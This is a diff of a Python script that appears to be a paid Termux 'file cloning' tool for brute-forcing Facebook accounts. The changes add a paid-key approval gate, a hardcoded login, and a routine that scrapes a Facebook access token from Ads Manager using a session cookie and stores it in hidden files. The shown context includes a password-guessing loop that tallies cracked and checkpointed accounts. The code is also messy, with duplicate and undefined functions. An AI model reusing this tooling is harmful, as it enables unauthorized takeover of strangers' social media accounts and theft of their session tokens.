@@ -1,5 +1,5 @@
 #-----------------[ MR-ALONE ]-------------------#
- 
+#Alone Tor Abba Akash Back
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -1631,35 +1631,184 @@ def TUTULj(u):
 def clear():
 	os.system('clear')
 #------------------[ MAIN ]-----------------#
-
+#------------------[ MACHINE-SUPPORT ]---------------#
+ 
+def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def clear():
+    os.system('clear')
+def back():
+    login()
+def contact():
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100088035424278')
+    back()
+def linex():
+    print('\033[1;37m')
+def animation(u):
+    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 os.system('xdg-open https://www.facebook.com/profile.php?id=100088035424278')
-logo =("""
+logo ="""
  ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
  ║\033[0;96m●▬▬▬▬▬๑🌸🕌۩[Bismillahir Rahmanir Rahim]۩🕌🌸๑▬▬▬▬▬▬●\033[0;91m║
  ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-        \33[0;91m 
-███████ ██   ██  █████  ██   ██ ██ ██████  
-██      ██   ██ ██   ██ ██  ██  ██ ██   ██ 
-███████ ███████ ███████ █████   ██ ██████  
-     ██ ██   ██ ██   ██ ██  ██  ██ ██   ██ 
-███████ ██   ██ ██   ██ ██   ██ ██ ██████ 
+        \33[0;91m █████╗ ██╗      ██████╗ ███╗   ██╗███████╗    
+        \33[0;91m██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝
+        \33[0;91m███████║██║     ██║   ██║██╔██╗ ██║█████╗      
+        \33[0;91m██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝      
+        \33[0;91m██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗    
+        \33[0;91m╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝      
  ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
  ║\33[0;95m[<🕌Assalamualaikum"Mind It,'You Will Never Alone🕴️>]\033[0;95m║
  ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[1;31m==================================================
-[] AUTHOR       :     MD SHAKIB
+[] AUTHOR       :      𝐌𝐑.𝐀𝐋𝐎𝐍𝐄 
 [] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆
 [] TYPE         :      𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)
-[] FACEBOOK     :      TEB SHAKIB
-[] VERSION      :      𝟔.𝟏
-[] MESSENGER    :      SHAKIB 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
-==================================================""")
+[] FACEBOOK     :      𝐀𝐋𝐎𝐍𝐄
+[] VERSION      :      7.3
+[] MESSENGER    :      𝗔𝗟𝗢𝗡𝗘 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
+=================================================="\033[1;23m"""                                
+balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
+meyermarexudi =(""" \033[0;97m=============================================""")    
+alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
+xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
+fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
+xudinaministar =(""" \033[38;1m[-] Importent Note """)
+hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)
+
+                  #____APPROVAL SYSTEM ADD_____#
+def meyexudi():
+  os.system('clear')
+  print(logo)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+  try:
+    httpCaht = requests.get('https://github.com/Mr-Alon/File-Cloning-Paid/blob/main/Paid.txt').text
+    if id in httpCaht:
+      print(fuckyoursali)
+      print(hedaborakarent)
+      msg = str(os.geteuid())
+      #time.sleep(0.5)
+      print()
+      pass
+    else:
+      print(meyermarexudi)
+     # print(" \033[32;1m[+] Your Kay : "+id)
+      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
+      print(' \x1b[1;98m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
+      print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
+      print(' \x1b[1;97m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
+      print(' \x1b[1;95m║══[𝟸]💥  15 DAY 250 TAKA ')
+      print(' \x1b[38;5;50m║══[𝟸]💥  30 DAY 500 TAKA ')
+      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   ALONE,    Please,   Send,   Your,   Key,"')
+      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
+      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801309177411?text='+tks),approval()      
+      time.sleep(1)
+      meyexudi()
+  except:
+    sys.exit()
+meyexudi()
+#os.system("python ALONE.py")
+def naima():
+	print('-------------------')
+print(logo)
+os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
+uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
+os.system('espeak -a 300 " Welcome,   to,  MR.ALONE,  PAID,   Tools"')
+def back():
+	login()
+	
+	import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
+    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
+
+    if username == 'V' and password == '7':
+        print(' \033[0;95mYou Have Successfully Logged in.')
+        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+        continue
+os.system('clear')
+pass
+ 
+ 
+def login():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+        tokenku.append(token)
+        try:
+            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+            sy2 = json.loads(sy.text)['name']
+            sy3 = json.loads(sy.text)['id']
+            menu(sy2,sy3)
+        except KeyError:
+            login_lagi334()
+        except requests.exceptions.ConnectionError:
+            print('\033[0;97m=================')
+            animation(' [×] NO INTERNET CONNECTION DETECTED')
+            exit()
+    except IOError:
+        login_lagi334()
+def login_lagi334():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+        tokenku.append(token)
+        try:
+            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+            sy2 = json.loads(sy.text)['name']
+            sy3 = json.loads(sy.text)['id']
+            menu(sy2,sy3)
+        except KeyError:
+            login_lagi334()
+        except requests.exceptions.ConnectionError:
+            print('\033[0;97m=================')
+            animation(' [×] NO INTERNET CONNECTION DETECTED')
+            exit()
+    except IOError:
+        login_lagi334()
+def login_lagi334():
+    try:
+        os.system('clear')
+        print(logo)
+        ses = requests.Session()
+        cookies = {'cookie':cookie}
+        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+        req = ses.get(url,cookies=cookies)
+        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+        roq = ses.get(nek,cookies=cookies)
+        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+        tokenw = open(".token.txt", "w").write(tok)
+        cokiew = open(".cok.txt", "w").write(cookie)
+      #exit()
+    except Exception as e:
+        os.system("rm -f .token.txt")
+        os.system("rm -f .cok.txt")
+        os.system("python nono.py")
+        exit()
+
 #------------------[ MENU ]----------------#
+ #===©===#
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.040)
 def menu():
     os.system('clear')
     print(logo)
-   # print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
-   # print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
+    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
     print('\033[0;97m===============================================')
     print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
     print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
@@ -1927,10 +2076,10 @@ def passwrd():
     os.system('clear')
     print(logo)
     print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
-    #print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
-  #  print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
+    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
+    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
     print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
-   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
     print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
     print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
     print('\x1b[38;5;50m===============================================')
@@ -2029,7 +2178,7 @@ def passwrd():
             else:
                 pool.submit(crackfree,idf,pwv)
     print('\n\033[1;37m===================================')
-  #  print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m===================================')
@@ -2121,4 +2270,13 @@ def crackfree(idf,pwv):
             time.sleep(31)
     loop+=1
  
+#-----------------------[ SYSTEM-CONTROL ]--------------------#
+ 
+if __name__=='__main__':
+    try:os.mkdir('OK')
+    except:pass
+    try:os.mkdir('CP')
+    except:pass
+    try:os.system('touch .prox.txt')
+    except:pass
 menu()
